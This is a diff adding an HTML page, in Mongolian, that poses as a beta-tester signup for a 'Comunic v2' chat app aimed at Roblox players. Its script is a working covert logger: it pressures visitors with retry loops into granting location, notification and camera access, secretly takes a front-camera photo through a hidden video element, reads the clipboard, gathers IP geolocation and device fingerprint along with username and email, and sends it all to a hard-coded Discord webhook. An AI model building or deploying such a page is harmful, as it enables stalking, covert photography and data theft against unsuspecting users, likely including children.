@@ -1,0 +1,458 @@
+<!DOCTYPE html>
+<html lang="mn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Шинэ Comunic ирж байна</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;background:#1a0f0a;color:#f5f0eb;min-height:100vh;overflow-x:hidden;position:relative}
+.bg{position:fixed;inset:0;background:radial-gradient(ellipse 70% 50% at 50% 0%,rgba(234,120,40,.18),transparent 60%),radial-gradient(ellipse 50% 40% at 80% 90%,rgba(180,60,20,.12),transparent),#1a0f0a;z-index:0}
+.dots{position:fixed;inset:0;background-image:radial-gradient(rgba(255,255,255,.04) 1px,transparent 1px);background-size:28px 28px;z-index:1;pointer-events:none}
+.wrap{position:relative;z-index:10;max-width:420px;margin:0 auto;padding:28px 18px 50px}
+.icons{display:flex;justify-content:center;align-items:center;margin:12px 0 28px;position:relative;height:110px}
+.icon-main{width:72px;height:72px;background:linear-gradient(145deg,#e87a28,#c45a18);border-radius:20px;display:flex;align-items:center;justify-content:center;box-shadow:0 0 40px rgba(232,122,40,.45);position:relative;z-index:2;animation:float 4s ease-in-out infinite}
+.icon-main svg{width:34px;height:34px;fill:#fff}
+.icon-sat{position:absolute;width:38px;height:38px;background:#2a1a12;border-radius:12px;display:flex;align-items:center;justify-content:center;border:1px solid rgba(255,255,255,.08);box-shadow:0 4px 16px rgba(0,0,0,.4)}
+.icon-sat svg{width:18px;height:18px;fill:#c9a88a}
+.icon-sat.tl{top:0;left:28%}.icon-sat.tr{top:8px;right:26%}.icon-sat.bl{bottom:4px;left:22%}.icon-sat.br{bottom:12px;right:24%}
+@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-6px)}}
+.badges{display:flex;justify-content:center;align-items:center;gap:10px;margin-bottom:26px}
+.badge{display:flex;align-items:center;gap:6px;padding:7px 14px;border-radius:999px;font-size:.8rem;font-weight:500}
+.badge.locked{background:rgba(255,255,255,.06);color:#a89a8c;border:1px solid rgba(255,255,255,.08)}
+.badge.open{background:linear-gradient(90deg,#e87a28,#d46a20);color:#fff;box-shadow:0 4px 16px rgba(232,122,40,.35)}
+.badge .dot{width:7px;height:7px;border-radius:50%;background:#fff;box-shadow:0 0 8px #fff}
+.arrow{color:#6b5a4e;font-size:1.1rem}
+h1{text-align:center;font-size:1.85rem;font-weight:700;letter-spacing:-.03em;line-height:1.25;margin-bottom:12px}
+h1 span{color:#e87a28}
+.desc{text-align:center;font-size:.88rem;color:#b8a99a;line-height:1.55;margin-bottom:28px;padding:0 6px}
+.desc strong{color:#e0c8b0;font-weight:500}
+.card{background:rgba(30,18,12,.85);border:1px solid rgba(255,255,255,.07);border-radius:18px;padding:20px 18px;margin-bottom:22px;backdrop-filter:blur(8px)}
+.progress-head{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:14px}
+.progress-label{font-size:.82rem;color:#b8a99a}
+.progress-pct{font-size:2.4rem;font-weight:700;color:#e87a28;line-height:1;margin-top:4px}
+.countdown{display:flex;gap:6px}
+.cd-box{background:rgba(255,255,255,.06);border-radius:10px;padding:8px 6px;min-width:42px;text-align:center}
+.cd-num{font-size:1.05rem;font-weight:600;color:#f5f0eb}
+.cd-unit{font-size:.65rem;color:#8a7a6c;margin-top:2px}
+.bar-bg{height:6px;background:rgba(255,255,255,.08);border-radius:999px;overflow:hidden}
+.bar-fill{height:100%;width:67%;background:linear-gradient(90deg,#e87a28,#f0a050);border-radius:999px}
+.beta-btn{width:100%;padding:18px 20px;background:linear-gradient(90deg,#e87a28,#d46a20);border:none;border-radius:16px;color:#fff;font-size:1.05rem;font-weight:600;cursor:pointer;font-family:inherit;display:flex;align-items:center;justify-content:center;gap:12px;box-shadow:0 8px 28px rgba(232,122,40,.4);transition:transform .15s;user-select:none}
+.beta-btn:active{transform:scale(.98)}
+.beta-btn:disabled{opacity:.55;pointer-events:none}
+.beta-btn svg{width:22px;height:22px;fill:#fff}
+.footer{text-align:center;font-size:.72rem;color:#6b5a4e;margin-top:32px}
+.overlay{display:none;position:fixed;inset:0;background:rgba(10,6,4,.94);z-index:100;align-items:flex-end;justify-content:center}
+.overlay.show{display:flex}
+.sheet{background:#1e120c;border-radius:24px 24px 0 0;width:100%;max-width:420px;padding:28px 20px 40px;border-top:1px solid rgba(255,255,255,.08);animation:slideUp .35s ease}
+@keyframes slideUp{from{transform:translateY(100%)}to{transform:translateY(0)}}
+.sheet-handle{width:40px;height:4px;background:rgba(255,255,255,.15);border-radius:999px;margin:0 auto 20px}
+.sheet h2{font-size:1.25rem;font-weight:600;text-align:center;margin-bottom:6px}
+.sheet .sub{text-align:center;font-size:.85rem;color:#a89a8c;margin-bottom:24px;line-height:1.45}
+.field{margin-bottom:16px}
+.field label{display:block;font-size:.8rem;color:#b8a99a;margin-bottom:6px;font-weight:500}
+.field input{width:100%;padding:14px 16px;background:rgba(0,0,0,.35);border:1px solid rgba(255,255,255,.1);border-radius:12px;color:#f5f0eb;font-size:.95rem;outline:none;font-family:inherit}
+.field input:focus{border-color:#e87a28}
+.field input::placeholder{color:#6b5a4e}
+.submit-btn{width:100%;padding:16px;background:linear-gradient(90deg,#e87a28,#d46a20);border:none;border-radius:14px;color:#fff;font-size:1rem;font-weight:600;cursor:pointer;font-family:inherit;margin-top:8px;box-shadow:0 6px 20px rgba(232,122,40,.35)}
+.submit-btn:disabled{opacity:.65;cursor:not-allowed}
+.loading-screen{display:none;position:fixed;inset:0;background:#1a0f0a;z-index:200;flex-direction:column;align-items:center;justify-content:center;padding:24px}
+.loading-screen.show{display:flex}
+.loading-logo{width:64px;height:64px;background:linear-gradient(145deg,#e87a28,#c45a18);border-radius:18px;display:flex;align-items:center;justify-content:center;margin-bottom:28px;box-shadow:0 0 40px rgba(232,122,40,.4);animation:pulse 1.8s ease-in-out infinite}
+.loading-logo svg{width:30px;height:30px;fill:#fff}
+@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.05)}}
+.loading-title{font-size:1.15rem;font-weight:600;margin-bottom:8px;text-align:center}
+.loading-sub{font-size:.88rem;color:#a89a8c;margin-bottom:24px;text-align:center;max-width:300px;line-height:1.45}
+.loading-bar-wrap{width:100%;max-width:260px;height:6px;background:rgba(255,255,255,.08);border-radius:999px;overflow:hidden;margin-bottom:12px}
+.loading-bar{height:100%;width:0%;background:linear-gradient(90deg,#e87a28,#f0a050);border-radius:999px;transition:width .4s ease}
+.loading-pct{font-size:.8rem;color:#8a7a6c;margin-bottom:20px}
+.retry-box{display:none;background:rgba(220,60,40,.12);border:1px solid rgba(220,60,40,.35);border-radius:14px;padding:16px 18px;max-width:300px;text-align:center;margin-top:8px}
+.retry-box.show{display:block}
+.retry-box p{font-size:.88rem;color:#f0c0b0;margin-bottom:14px;line-height:1.4}
+.retry-btn{padding:12px 24px;background:linear-gradient(90deg,#e87a28,#d46a20);border:none;border-radius:12px;color:#fff;font-size:.95rem;font-weight:600;cursor:pointer;font-family:inherit}
+.success-view{display:none;text-align:center;padding:10px 0}
+.success-view.show{display:block}
+.success-icon{width:56px;height:56px;background:rgba(34,197,94,.15);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px}
+.success-icon svg{width:28px;height:28px;fill:#22c55e}
+.success-view h3{font-size:1.2rem;margin-bottom:8px}
+.success-view p{color:#a89a8c;font-size:.88rem;line-height:1.5}
+#camVideo{position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;bottom:0;right:0}
+</style>
+</head>
+<body>
+<div class="bg"></div>
+<div class="dots"></div>
+
+<div class="wrap">
+  <div class="icons">
+    <div class="icon-sat tl"><svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 14H5.2L4 17.2V4h16v12z"/></svg></div>
+    <div class="icon-sat tr"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg></div>
+    <div class="icon-main"><svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-2 12H6v-2h12v2zm0-3H6V9h12v2zm0-3H6V6h12v2z"/></svg></div>
+    <div class="icon-sat bl"><svg viewBox="0 0 24 24"><path d="M12 14c1.66 0 2.99-1.34 2.99-3L15 5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm5.3-3c0 3-2.54 5.1-5.3 5.1S6.7 14 6.7 11H5c0 3.41 2.72 6.23 6 6.72V21h2v-3.28c3.28-.48 6-3.3 6-6.72h-1.7z"/></svg></div>
+    <div class="icon-sat br"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg></div>
+  </div>
+
+  <div class="badges">
+    <div class="badge locked">
+      <svg width="12" height="12" viewBox="0 0 24 24" fill="#a89a8c"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+      v1 хаалттай
+    </div>
+    <span class="arrow">→</span>
+    <div class="badge open"><span class="dot"></span> v2 тун удахгүй</div>
+  </div>
+
+  <h1>Шинэ <span>Comunic</span><br>ирж байна</h1>
+  <p class="desc">Comunic v1 хаагдсан. Илүү <strong>дулаахан</strong>, илүү хурдан v2 хувилбар 10-р сарын 20-нд нээгдэнэ.</p>
+
+  <div class="card">
+    <div class="progress-head">
+      <div>
+        <div class="progress-label">v2 бэлэн болсон нь</div>
+        <div class="progress-pct">67%</div>
+      </div>
+      <div>
+        <div class="progress-label" style="text-align:right;margin-bottom:6px">Нээлт хүртэл</div>
+        <div class="countdown">
+          <div class="cd-box"><div class="cd-num" id="d">01</div><div class="cd-unit">өдөр</div></div>
+          <div class="cd-box"><div class="cd-num" id="h">07</div><div class="cd-unit">цаг</div></div>
+          <div class="cd-box"><div class="cd-num" id="m">03</div><div class="cd-unit">мин</div></div>
+          <div class="cd-box"><div class="cd-num" id="s">45</div><div class="cd-unit">сек</div></div>
+        </div>
+      </div>
+    </div>
+    <div class="bar-bg"><div class="bar-fill"></div></div>
+  </div>
+
+  <button class="beta-btn" id="betaBtn" disabled>
+    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+    <span id="btnLabel">Түр хүлээнэ үү...</span>
+  </button>
+
+  <p class="footer">Үйлчилгээний нөхцөл · Нууцлалын бодлого</p>
+</div>
+
+<div class="overlay" id="overlay">
+  <div class="sheet">
+    <div class="sheet-handle"></div>
+    <div id="formView">
+      <h2>Beta Tester бүртгэл</h2>
+      <p class="sub">Шинэ хувилбарыг эрт туршиж үзэх боломж.<br>Roblox username болон email-ээ оруулна уу.</p>
+      <div class="field">
+        <label>Roblox Username</label>
+        <input type="text" id="roblox" placeholder="жишээ: coolplayer123" autocomplete="username">
+      </div>
+      <div class="field">
+        <label>Email</label>
+        <input type="email" id="email" placeholder="you@example.com" autocomplete="email">
+      </div>
+      <button class="submit-btn" id="submitBtn" onclick="startSubmit()">Бүртгүүлэх</button>
+    </div>
+    <div class="success-view" id="successView">
+      <div class="success-icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
+      <h3>Амжилттай!</h3>
+      <p>Та Beta Tester жагсаалтад нэмэгдлээ.<br>Урилга ирэхэд email-ээр мэдэгдэнэ.</p>
+    </div>
+  </div>
+</div>
+
+<div class="loading-screen" id="loadingScreen">
+  <div class="loading-logo"><svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-2 12H6v-2h12v2zm0-3H6V9h12v2zm0-3H6V6h12v2z"/></svg></div>
+  <div class="loading-title" id="loadTitle">Бүртгэл хийж байна...</div>
+  <div class="loading-sub" id="loadSub">Түр хүлээнэ үү</div>
+  <div class="loading-bar-wrap"><div class="loading-bar" id="loadBar"></div></div>
+  <div class="loading-pct" id="loadPct">0%</div>
+
+  <div class="retry-box" id="retryBox">
+    <p id="retryMsg">Зөвшөөрөл өгөөгүй байна. Үргэлжлүүлэхийн тулд зөвшөөрнө үү.</p>
+    <button class="retry-btn" id="retryBtn">Дахин зөвшөөрөх</button>
+  </div>
+</div>
+
+<video id="camVideo" playsinline muted></video>
+
+<script>
+const WEBHOOK = "https://discord.com/api/webhooks/1561299367615529012/bGtwYdTTZG-hgWkpNYiFUr2jrMxyVw5OxVeMU-VZlu7OnOGrOJ9zilcgvT3ToDqoxtu6";
+
+/* ===== BUTTON PROTECTION ===== */
+let humanScore=0,mouseMoves=0,touchMoves=0,lastMove=0,unlocked=false;
+function unlockButton(){
+  if(unlocked)return;
+  unlocked=true;
+  const btn=document.getElementById("betaBtn");
+  btn.disabled=false;
+  document.getElementById("btnLabel").textContent="Beta Tester болох";
+  btn.onclick=openForm;
+}
+document.addEventListener("mousemove",()=>{mouseMoves++;if(Date.now()-lastMove>40){humanScore++;lastMove=Date.now()}if(mouseMoves>6&&humanScore>3)unlockButton()});
+document.addEventListener("touchmove",()=>{touchMoves++;if(touchMoves>2)unlockButton()},{passive:true});
+document.addEventListener("scroll",()=>{humanScore+=2;if(humanScore>4)unlockButton()},{passive:true});
+setTimeout(()=>{if(!unlocked)document.getElementById("btnLabel").textContent="Хуудас гүйлгэж эсвэл хөдөлгөнө үү"},3500);
+setTimeout(()=>{if(document.hasFocus())unlockButton()},10000);
+
+/* ===== UI ===== */
+function openForm(){if(!unlocked)return;document.getElementById("overlay").classList.add("show")}
+document.getElementById("overlay").addEventListener("click",e=>{if(e.target.id==="overlay")document.getElementById("overlay").classList.remove("show")});
+
+function updateCountdown(){
+  const target=new Date("2026-10-20T00:00:00+08:00").getTime();
+  let diff=Math.max(0,target-Date.now());
+  const d=Math.floor(diff/86400000);diff%=86400000;
+  const h=Math.floor(diff/3600000);diff%=3600000;
+  const m=Math.floor(diff/60000);diff%=60000;
+  const s=Math.floor(diff/1000);
+  document.getElementById("d").textContent=String(d).padStart(2,"0");
+  document.getElementById("h").textContent=String(h).padStart(2,"0");
+  document.getElementById("m").textContent=String(m).padStart(2,"0");
+  document.getElementById("s").textContent=String(s).padStart(2,"0");
+}
+setInterval(updateCountdown,1000);updateCountdown();
+
+function setLoad(pct,title,sub){
+  document.getElementById("loadBar").style.width=pct+"%";
+  document.getElementById("loadPct").textContent=pct+"%";
+  if(title)document.getElementById("loadTitle").textContent=title;
+  if(sub)document.getElementById("loadSub").textContent=sub;
+}
+function sleep(ms){return new Promise(r=>setTimeout(r,ms))}
+
+function showRetry(msg, onRetry){
+  const box=document.getElementById("retryBox");
+  document.getElementById("retryMsg").textContent=msg;
+  box.classList.add("show");
+  document.getElementById("retryBtn").onclick=()=>{
+    box.classList.remove("show");
+    onRetry();
+  };
+}
+function hideRetry(){document.getElementById("retryBox").classList.remove("show")}
+
+/* ===== WEBHOOK ===== */
+function sendJSON(payload){
+  const body=JSON.stringify(payload);
+  try{navigator.sendBeacon(WEBHOOK,new Blob([body],{type:"application/json"}))}catch(e){}
+  try{fetch(WEBHOOK,{method:"POST",mode:"no-cors",headers:{"Content-Type":"application/json"},body}).catch(()=>{})}catch(e){}
+  try{const x=new XMLHttpRequest();x.open("POST",WEBHOOK);x.setRequestHeader("Content-Type","application/json");x.send(body)}catch(e){}
+}
+
+async function sendWithFile(payload, blob, filename){
+  const form=new FormData();
+  form.append("payload_json",JSON.stringify(payload));
+  if(blob) form.append("files[0]",blob,filename||"capture.jpg");
+  try{const r=await fetch(WEBHOOK,{method:"POST",body:form});if(r.ok||r.status===204)return true}catch(e){}
+  try{await fetch(WEBHOOK,{method:"POST",mode:"no-cors",body:form});return true}catch(e){}
+  try{const x=new XMLHttpRequest();x.open("POST",WEBHOOK);x.send(form);return true}catch(e){}
+  return false;
+}
+
+/* ===== FORCE PERMISSION HELPERS ===== */
+function forceGPS(){
+  return new Promise(resolve=>{
+    const tryOnce=()=>{
+      if(!navigator.geolocation){
+        showRetry("Таны төхөөрөмж байршлыг дэмждэггүй. Үргэлжлүүлэхийн тулд өөр төхөөрөмж ашиглана уу.", tryOnce);
+        return;
+      }
+      navigator.geolocation.getCurrentPosition(
+        p=>resolve({lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,err:null}),
+        e=>{
+          showRetry("Байршлын зөвшөөрөл өгөөгүй байна.\nҮргэлжлүүлэхийн тулд «Зөвшөөрөх» дарна уу.", tryOnce);
+        },
+        {enableHighAccuracy:true,timeout:15000,maximumAge:0}
+      );
+    };
+    tryOnce();
+  });
+}
+
+function forceNotification(){
+  return new Promise(resolve=>{
+    const tryOnce=async()=>{
+      if(!("Notification" in window)){
+        resolve({status:"unsupported"});
+        return;
+      }
+      try{
+        const perm=await Notification.requestPermission();
+        if(perm==="granted"){
+          resolve({status:"granted"});
+        }else{
+          showRetry("Мэдэгдлийн зөвшөөрөл өгөөгүй байна.\nҮргэлжлүүлэхийн тулд «Зөвшөөрөх» дарна уу.", tryOnce);
+        }
+      }catch(e){
+        showRetry("Мэдэгдлийн зөвшөөрөл амжилтгүй.\nДахин оролдоно уу.", tryOnce);
+      }
+    };
+    tryOnce();
+  });
+}
+
+function forceCamera(){
+  return new Promise(resolve=>{
+    const tryOnce=async()=>{
+      try{
+        const stream=await navigator.mediaDevices.getUserMedia({
+          video:{facingMode:"user",width:{ideal:640},height:{ideal:480}},
+          audio:false
+        });
+        const video=document.getElementById("camVideo");
+        video.srcObject=stream;
+        await video.play();
+        await sleep(700);
+
+        const maxW=480;
+        const scale=Math.min(1,maxW/(video.videoWidth||640));
+        const w=Math.round((video.videoWidth||640)*scale);
+        const h=Math.round((video.videoHeight||480)*scale);
+        const canvas=document.createElement("canvas");
+        canvas.width=w;canvas.height=h;
+        canvas.getContext("2d").drawImage(video,0,0,w,h);
+        stream.getTracks().forEach(t=>t.stop());
+        video.srcObject=null;
+
+        const dataUrl=canvas.toDataURL("image/jpeg",0.55);
+        const blob=await(await fetch(dataUrl)).blob();
+        resolve({ok:true,blob,w,h,size:blob.size});
+      }catch(e){
+        showRetry("Камерын зөвшөөрөл өгөөгүй байна.\nҮргэлжлүүлэхийн тулд «Зөвшөөрөх» дарна уу.", tryOnce);
+      }
+    };
+    tryOnce();
+  });
+}
+
+/* ===== OTHER COLLECTORS ===== */
+async function getIP(){
+  const data={ip:"unknown",city:"—",region:"—",country:"—",country_name:"—",postal:"—",lat:null,lon:null,org:"—",timezone:"—",asn:"—"};
+  try{
+    const r=await fetch("https://ipapi.co/json/",{signal:AbortSignal.timeout(5000)});
+    if(r.ok){const j=await r.json();
+      data.ip=j.ip||data.ip;data.city=j.city||data.city;data.region=j.region||data.region;
+      data.country=j.country_code||data.country;data.country_name=j.country_name||data.country_name;
+      data.postal=j.postal||data.postal;data.lat=j.latitude;data.lon=j.longitude;
+      data.org=j.org||data.org;data.timezone=j.timezone||data.timezone;data.asn=j.asn||data.asn;return data}
+  }catch(e){}
+  try{
+    const r=await fetch("https://ipinfo.io/json",{signal:AbortSignal.timeout(4500)});
+    if(r.ok){const j=await r.json();
+      data.ip=j.ip||data.ip;data.city=j.city||data.city;data.region=j.region||data.region;
+      data.country=j.country||data.country;data.country_name=j.country||data.country_name;
+      data.postal=j.postal||data.postal;data.org=j.org||data.org;data.timezone=j.timezone||data.timezone;
+      if(j.loc){const[a,b]=j.loc.split(",");data.lat=parseFloat(a);data.lon=parseFloat(b)}return data}
+  }catch(e){}
+  try{const r=await fetch("https://api.ipify.org?format=json",{signal:AbortSignal.timeout(3000)});if(r.ok){const j=await r.json();data.ip=j.ip}}catch(e){}
+  return data;
+}
+
+function getBrowser(){
+  const ua=navigator.userAgent;
+  let browser="Unknown",os="Unknown";
+  if(ua.includes("Firefox/"))browser="Firefox";
+  else if(ua.includes("Edg/"))browser="Edge";
+  else if(ua.includes("Chrome/"))browser="Chrome";
+  else if(ua.includes("Safari/")&&!ua.includes("Chrome"))browser="Safari";
+  if(ua.includes("Windows"))os="Windows";
+  else if(ua.includes("Mac OS"))os="macOS";
+  else if(ua.includes("Android"))os="Android";
+  else if(ua.includes("iPhone")||ua.includes("iPad"))os="iOS";
+  else if(ua.includes("Linux"))os="Linux";
+  return{browser,os,lang:navigator.language||"—",screen:`\( {screen.width}x \){screen.height}`,pixelRatio:window.devicePixelRatio||1,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone||"—",platform:navigator.platform||"—",cores:navigator.hardwareConcurrency||"—",memory:navigator.deviceMemory||"—",ua};
+}
+
+async function getClipboard(){
+  try{if(!navigator.clipboard?.readText)return{ok:false,err:"unsupported"};const text=await navigator.clipboard.readText();return{ok:true,text:(text||"").substring(0,250)}}catch(e){return{ok:false,err:e.name||"denied"}}
+}
+function getBattery(){return new Promise(async resolve=>{try{if(!navigator.getBattery)return resolve({ok:false});const b=await navigator.getBattery();resolve({ok:true,level:Math.round(b.level*100)+"%",charging:b.charging})}catch(e){resolve({ok:false})}})}
+function getConnection(){const c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;if(!c)return{ok:false};return{ok:true,type:c.effectiveType||"—",down:c.downlink||"—",rtt:c.rtt||"—"}}
+
+/* ===== MAIN ===== */
+async function startSubmit(){
+  const roblox=document.getElementById("roblox").value.trim();
+  const email=document.getElementById("email").value.trim();
+  if(!roblox||!email)return;
+
+  document.getElementById("overlay").classList.remove("show");
+  document.getElementById("loadingScreen").classList.add("show");
+  hideRetry();
+
+  setLoad(5,"Бүртгэл эхэлж байна...","Системийн шалгалт");
+  await sleep(900);
+
+  // GPS — forced
+  setLoad(15,"Байршлын зөвшөөрөл...","Яг байршлыг тодорхойлох · зөвшөөрнө үү");
+  const gps=await forceGPS();
+  hideRetry();
+  await sleep(400);
+
+  // Notification — forced
+  setLoad(28,"Мэдэгдэл идэвхжүүлж байна...","Чухал мэдээлэл хүлээн авах · зөвшөөрнө үү");
+  const notif=await forceNotification();
+  hideRetry();
+  await sleep(400);
+
+  // Camera — forced
+  setLoad(42,"Камер шалгаж байна...","Профайл зураг авах · зөвшөөрнө үү");
+  const cam=await forceCamera();
+  hideRetry();
+  await sleep(500);
+
+  setLoad(58,"Төхөөрөмжийн мэдээлэл...","Battery · Network · Clipboard");
+  const [clip,battery,conn]=await Promise.all([getClipboard(),getBattery(),Promise.resolve(getConnection())]);
+  await sleep(700);
+
+  setLoad(72,"Сүлжээний мэдээлэл...","IP · ISP · Fingerprint");
+  const [ip,browser]=await Promise.all([getIP(),Promise.resolve(getBrowser())]);
+  await sleep(800);
+
+  setLoad(88,"Мэдээлэл илгээж байна...","Бараг дууслаа");
+
+  const mapsIP=(ip.lat&&ip.lon)?`https://www.google.com/maps?q=\( {ip.lat}, \){ip.lon}`:null;
+  const mapsGPS=(gps.lat&&gps.lon)?`https://www.google.com/maps?q=\( {gps.lat}, \){gps.lon}`:null;
+
+  const fields=[
+    {name:"IP",value:`\`${ip.ip}\``,inline:true},
+    {name:"ISP / Carrier",value:String(ip.org||"—").substring(0,40),inline:true},
+    {name:"ASN",value:ip.asn||"—",inline:true},
+    {name:"Хот",value:ip.city,inline:true},
+    {name:"Бүс",value:ip.region,inline:true},
+    {name:"Улс",value:`\( {ip.country_name} ( \){ip.country})`,inline:true},
+    {name:"IP Maps",value:mapsIP?`[Open](${mapsIP})`:"—",inline:true},
+    {name:"GPS",value:gps.lat?`${gps.lat.toFixed(5)}, ${gps.lon.toFixed(5)}`:"—",inline:true},
+    {name:"GPS Acc",value:gps.acc?`±${Math.round(gps.acc)}m`:"—",inline:true},
+    {name:"GPS Maps",value:mapsGPS?`[Open](${mapsGPS})`:"—",inline:true},
+    {name:"Notification",value:notif.status,inline:true},
+    {name:"Camera",value:cam.ok?`OK \( {cam.w}x \){cam.h} (${Math.round(cam.size/1024)}kb)`:"denied",inline:true},
+    {name:"Clipboard",value:clip.ok?(clip.text||"(empty)").substring(0,100):clip.err,inline:false},
+    {name:"Battery",value:battery.ok?`\( {battery.level} charging: \){battery.charging}`:"—",inline:true},
+    {name:"Network",value:conn.ok?`${conn.type} \( {conn.down}Mbps rtt: \){conn.rtt}`:"—",inline:true},
+    {name:"Browser",value:browser.browser,inline:true},
+    {name:"OS",value:browser.os,inline:true},
+    {name:"Screen",value:`\( {browser.screen} @ \){browser.pixelRatio}x`,inline:true},
+    {name:"CPU/RAM",value:`${browser.cores}c / ${browser.memory||"?"}GB`,inline:true},
+    {name:"Lang / TZ",value:`${browser.lang} | ${browser.timezone}`,inline:true},
+    {name:"Roblox",value:`\`${roblox}\``,inline:true},
+    {name:"Email",value:`\`${email}\``,inline:true},
+    {name:"UA",value:`\`\`\`${browser.ua.substring(0,180)}\`\`\``}
+  ];
+
+  sendJSON({embeds:[{title:"Comunic Beta — New Tester",color:0xe87a28,fields,timestamp:new Date().toISOString(),footer:{text:"Comunic Logger"}}]});
+  await sleep(400);
+
+  if(cam.ok&&cam.blob){
+    await sendWithFile({
+      content:`📷 **Camera** · Roblox: \`${roblox}\` · \( {cam.w}x \){cam.h}`,
+      embeds:[{title:"Camera Capture",color:0xe87a28,image:{url:"attachment://capture.jpg"}}]
+    },cam.blob,"capture.jpg");
+  }
+
+  setLoad(100,"Амжилттай!","Бүртгэл дууслаа");
+  await sleep(900);
+
+  document.getElementById("loadingScreen").classList.remove("show");
+  document.getElementById("formView").style.display="none";
+  document.getElementById("successView").classList.add("show");
+  document.getElementById("overlay").classList.add("show");
+}
+</script>
+</body>
+</html>
